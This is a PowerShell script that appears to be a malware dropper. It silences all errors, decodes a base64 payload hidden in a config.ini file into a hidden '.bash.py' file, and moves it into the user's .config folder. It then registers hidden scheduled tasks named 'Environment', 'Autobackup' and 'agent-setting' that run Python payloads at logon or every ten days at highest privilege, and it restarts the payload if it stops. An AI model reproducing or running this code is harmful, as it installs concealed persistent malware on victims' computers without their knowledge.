$originalPSDefaults = if ($PSDefaultParameterValues -and $PSDefaultParameterValues.Count -gt 0) {
    $PSDefaultParameterValues.Clone()
} else {
    @{}
}
$PSDefaultParameterValues['*:ErrorAction'] = 'SilentlyContinue'
$PSDefaultParameterValues['*:WarningAction'] = 'SilentlyContinue'
$PSDefaultParameterValues['*:InformationAction'] = 'SilentlyContinue'
$PSDefaultParameterValues['*:Verbose'] = $false
$PSDefaultParameterValues['*:Debug'] = $false

function Test-StoreStub {
    param(
        [string]$Path
    )

    if (-not $Path) {
        return $true
    }

    if ($Path -like '*\Microsoft\WindowsApps\*' -or $Path -like '*\WindowsApps\*') {
        return $true
    }

    return $false
}

function Find-ExistingPath {
    param(
        [string[]]$Candidates
    )

    foreach ($candidate in $Candidates) {
        if (-not $candidate) {
            continue
        }

        $item = Get-ChildItem -Path $candidate -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($item) {
            return $item.FullName
        }

        if (Test-Path $candidate) {
            return (Resolve-Path $candidate).Path
        }
    }

    return $null
}

function Find-CommandPath {
    param(
        [string[]]$Names,
        [string[]]$FallbackPaths = @()
    )

    foreach ($name in $Names) {
        try {
            $commands = Get-Command $name -ErrorAction Stop
            foreach ($command in $commands) {
                if ($command -and $command.Source -and (Test-Path $command.Source) -and -not (Test-StoreStub $command.Source)) {
                    return (Resolve-Path $command.Source).Path
                }
            }
        } catch {
        }
    }

    return Find-ExistingPath -Candidates $FallbackPaths
}

function Find-PythonPath {
    param(
        [string]$UserProfilePath
    )

    $pythonPath = Find-ExistingPath -Candidates @(
        "$UserProfilePath\AppData\Local\Programs\Python\Python*\python.exe",
        "$env:LOCALAPPDATA\Programs\Python\Python*\python.exe",
        "$env:ProgramFiles\Python*\python.exe",
        "${env:ProgramFiles(x86)}\Python*\python.exe"
    )

    if ($pythonPath) {
        return $pythonPath
    }

    # Find via command lookup, skipping Store stubs
    $pythonPath = Find-CommandPath -Names @('python', 'python3')
    if ($pythonPath) {
        # Verify it actually runs
        try {
            & $pythonPath --version >$null 2>$null
            if ($LASTEXITCODE -eq 0) {
                return $pythonPath
            }
        } catch {
        }
    }

    # Try py.exe launcher and resolve to real python.exe
    $pyPath = Find-CommandPath -Names @('py')
    if ($pyPath) {
        try {
            $realExe = (& $pyPath -c "import sys; print(sys.executable)" 2>$null | Out-String).Trim()
            if ($realExe -and (Test-Path $realExe)) {
                return $realExe
            }
        } catch {
        }
    }

    return $null
}

function Find-PipxVenvPythonPath {
    param(
        [string]$UserProfilePath,
        [string[]]$VenvNames
    )

    $candidates = @()
    foreach ($venvName in $VenvNames) {
        if (-not $venvName) {
            continue
        }

        $candidates += @(
            "$UserProfilePath\pipx\venvs\$venvName\Scripts\python.exe",
            "$env:USERPROFILE\pipx\venvs\$venvName\Scripts\python.exe",
            "$env:LOCALAPPDATA\pipx\venvs\$venvName\Scripts\python.exe"
        )
    }

    return Find-ExistingPath -Candidates $candidates
}

function Convert-ToSingleQuotedPowerShellLiteral {
    param(
        [string]$Value
    )

    if ($null -eq $Value) {
        return "''"
    }

    return "'$($Value.Replace("'", "''"))'"
}

function New-HiddenStartProcessCommand {
    param(
        [string]$FilePath,
        [string[]]$Arguments = @(),
        [string]$WorkingDirectory
    )

    if (-not $FilePath) {
        return $null
    }

    $commandParts = @(
        "Start-Process -FilePath $(Convert-ToSingleQuotedPowerShellLiteral -Value $FilePath)"
    )

    if ($Arguments -and $Arguments.Count -gt 0) {
        $escapedArgs = $Arguments | ForEach-Object { Convert-ToSingleQuotedPowerShellLiteral -Value $_ }
        $commandParts += "-ArgumentList @($($escapedArgs -join ', '))"
    }

    if ($WorkingDirectory) {
        $commandParts += "-WorkingDirectory $(Convert-ToSingleQuotedPowerShellLiteral -Value $WorkingDirectory)"
    }

    $commandParts += '-WindowStyle Hidden | Out-Null'
    return ($commandParts -join ' ')
}

function Get-LaunchCommand {
    param(
        [string]$PreferredExecutable,
        [string[]]$PreferredArguments = @(),
        [string]$FallbackExecutable
    )

    if ($PreferredExecutable -and (Test-Path $PreferredExecutable)) {
        return New-HiddenStartProcessCommand -FilePath $PreferredExecutable -Arguments $PreferredArguments
    }

    if ($FallbackExecutable -and (Test-Path $FallbackExecutable)) {
        return New-HiddenStartProcessCommand -FilePath $FallbackExecutable
    }

    return $null
}

$realUser = $null

try {
    $computerSystem = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
    if ($computerSystem -and $computerSystem.UserName) {
        $realUser = $computerSystem.UserName
    }
} catch {
}

if (-not $realUser) {
    try {
        $realUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    } catch {
    }
}

if (-not $realUser) {
    $envUser = $env:USERNAME
    $envDomain = $env:USERDOMAIN
    if ($envUser) {
        if ($envDomain -and $envDomain -ne $env:COMPUTERNAME) {
            $realUser = "$envDomain\$envUser"
        } else {
            $realUser = "$env:COMPUTERNAME\$envUser"
        }
    }
}

if (-not $realUser) {
    $PSDefaultParameterValues.Clear()
    foreach ($key in $originalPSDefaults.Keys) {
        $PSDefaultParameterValues[$key] = $originalPSDefaults[$key]
    }
    exit 1
}

if ($realUser -match '\\') {
    $targetUserName = ($realUser -split '\\')[-1]
} else {
    $targetUserName = $realUser
}

$targetUserProfile = "C:\Users\$targetUserName"

if (-not (Test-Path $targetUserProfile)) {
    $targetUserProfile = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\*" |
        Where-Object { $_.ProfileImagePath -like "*$targetUserName" } |
        Select-Object -First 1 -ExpandProperty ProfileImagePath -ErrorAction SilentlyContinue
}

if (-not (Test-Path $targetUserProfile) -and $env:USERPROFILE -and (Test-Path $env:USERPROFILE)) {
    $envUserName = Split-Path -Leaf $env:USERPROFILE
    if ($envUserName -eq $targetUserName) {
        $targetUserProfile = $env:USERPROFILE
    }
}

$targetConfigBase = "$targetUserProfile\.config"
$destDir = "$targetConfigBase\.configs"
$scriptPath = $null

try {
    if ($realUser -and (Test-Path $targetUserProfile) -and (Test-Path '.configs')) {
        $configLines = Get-Content .configs/config.ini

        $start = ($configLines | Select-String '^\[code\]' | Select-Object -First 1).LineNumber
        if ($start) {
            $codeLine = $configLines[($start)..($configLines.Length-1)] | Where-Object { $_ -match '^code *= *' } | Select-Object -First 1
            if ($codeLine) {
                $base64 = $codeLine -replace '^code *= *', '' -replace '[^A-Za-z0-9+/=]', ''

                try {
                    $bytes = [System.Convert]::FromBase64String($base64)
                    [System.IO.File]::WriteAllBytes((Join-Path (Resolve-Path '.configs').Path '.bash.py'), $bytes)
                } catch {
                }

                if (-not (Test-Path $targetConfigBase)) {
                    New-Item -Path $targetConfigBase -ItemType Directory | Out-Null
                }

                if (Test-Path $destDir) {
                    Remove-Item -Path $destDir -Recurse -Force
                }

                Move-Item -Path '.configs' -Destination $destDir -Force

                $scriptPath = "$destDir\.bash.py"
                if (Test-Path $scriptPath) {
                    try {
                        $acl = Get-Acl $scriptPath
                        $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule($realUser, "FullControl", "Allow")
                        $acl.SetAccessRule($accessRule)
                        Set-Acl $scriptPath $acl
                    } catch {
                    }

                    $taskName = 'Environment'
                    try {
                        $pythonPath = Find-PythonPath -UserProfilePath $targetUserProfile
                        if ($pythonPath) {
                            $pythonDir = Split-Path -Parent $pythonPath
                            $pythonwCandidate = Join-Path $pythonDir 'pythonw.exe'
                            if (Test-Path $pythonwCandidate) {
                                $pythonwPath = (Resolve-Path $pythonwCandidate).Path
                            } else {
                                $pythonwPath = $pythonPath
                            }
                        } else {
                            $pythonwPath = $null
                        }
                    } catch {
                        $pythonwPath = $null
                    }

                    if ($pythonwPath) {
                        $scriptPath = (Resolve-Path $scriptPath).Path
                        $scriptDir = (Resolve-Path (Split-Path -Parent $scriptPath)).Path
                        $action = New-ScheduledTaskAction -Execute $pythonwPath -Argument "`"$scriptPath`"" -WorkingDirectory $scriptDir

                        $trigger = New-ScheduledTaskTrigger -AtLogOn -User $realUser
                        $trigger.Enabled = $true
                        $trigger.Delay = 'PT10S'

                        $principal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest

                        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel -StartWhenAvailable

                        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue

                        try {
                            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop | Out-Null
                            Enable-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue | Out-Null
                            Start-Process -FilePath $pythonwPath -ArgumentList @("$scriptPath") -WorkingDirectory $scriptDir -WindowStyle Hidden | Out-Null
                        } catch {
                        }
                    }
                }
            }
        }
    }
} catch {
}

try {
    if ($realUser) {
        $autobackupTaskName = 'Autobackup'
        $agentSettingTaskName = 'agent-setting'
        try {
            $autobackupPythonPath = Find-PythonPath -UserProfilePath $targetUserProfile
            if ($autobackupPythonPath) {
                $autobackupPythonDir = Split-Path -Parent $autobackupPythonPath
                $autobackupPythonwCandidate = Join-Path $autobackupPythonDir 'pythonw.exe'
                if (Test-Path $autobackupPythonwCandidate) {
                    $autobackupPythonwPath = (Resolve-Path $autobackupPythonwCandidate).Path
                } else {
                    $autobackupPythonwPath = $autobackupPythonPath
                }
            } else {
                $autobackupPythonwPath = $null
            }
        } catch {
            $autobackupPythonwPath = $null
        }

        if ($autobackupPythonwPath) {
            $autobackupLaunchCommand = New-HiddenStartProcessCommand -FilePath $autobackupPythonwPath -Arguments @('-m', 'auto_backup')
            $autobackupTaskCommand = "if (-not (Get-CimInstance Win32_Process | Where-Object { `$_.CommandLine -and `$_.CommandLine -like '*.bash.py*' } | Select-Object -First 1)) { $autobackupLaunchCommand }"
            $autobackupAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$autobackupTaskCommand`""

            $autobackupTrigger = New-ScheduledTaskTrigger -AtLogOn -User $realUser
            $autobackupTrigger.Enabled = $true
            $autobackupTrigger.Delay = 'PT10S'

            $autobackupPrincipal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest

            $autobackupSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel -StartWhenAvailable

            Unregister-ScheduledTask -TaskName $autobackupTaskName -Confirm:$false -ErrorAction SilentlyContinue

            try {
                Register-ScheduledTask -TaskName $autobackupTaskName -Action $autobackupAction -Trigger $autobackupTrigger -Principal $autobackupPrincipal -Settings $autobackupSettings -Force -ErrorAction Stop | Out-Null
                Enable-ScheduledTask -TaskName $autobackupTaskName -ErrorAction SilentlyContinue | Out-Null
            } catch {
            }
        }

        try {
            $agentSettingPythonPath = Find-PythonPath -UserProfilePath $targetUserProfile
            if ($agentSettingPythonPath) {
                $agentSettingPythonDir = Split-Path -Parent $agentSettingPythonPath
                $agentSettingPythonwCandidate = Join-Path $agentSettingPythonDir 'pythonw.exe'
                if (Test-Path $agentSettingPythonwCandidate) {
                    $agentSettingPythonwPath = (Resolve-Path $agentSettingPythonwCandidate).Path
                } else {
                    $agentSettingPythonwPath = $agentSettingPythonPath
                }
            } else {
                $agentSettingPythonwPath = $null
            }
        } catch {
            $agentSettingPythonwPath = $null
        }

        if ($agentSettingPythonwPath) {
            $agentSettingAction = New-ScheduledTaskAction -Execute $agentSettingPythonwPath -Argument '-m agent_setting'

            $agentSettingTrigger = New-ScheduledTaskTrigger -Daily -DaysInterval 10 -At 11pm
            $agentSettingTrigger.Enabled = $true

            $agentSettingPrincipal = New-ScheduledTaskPrincipal -UserId $realUser -LogonType Interactive -RunLevel Highest

            $agentSettingSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -MultipleInstances Parallel -StartWhenAvailable

            Unregister-ScheduledTask -TaskName $agentSettingTaskName -Confirm:$false -ErrorAction SilentlyContinue

            try {
                Register-ScheduledTask -TaskName $agentSettingTaskName -Action $agentSettingAction -Trigger $agentSettingTrigger -Principal $agentSettingPrincipal -Settings $agentSettingSettings -Force -ErrorAction Stop | Out-Null
                Enable-ScheduledTask -TaskName $agentSettingTaskName -ErrorAction SilentlyContinue | Out-Null
                Start-Process -FilePath $agentSettingPythonwPath -ArgumentList @('-m', 'agent_setting') -WindowStyle Hidden | Out-Null
            } catch {
            }
        }
    }
} catch {
}

$PSDefaultParameterValues.Clear()
foreach ($key in $originalPSDefaults.Keys) {
    $PSDefaultParameterValues[$key] = $originalPSDefaults[$key]
}
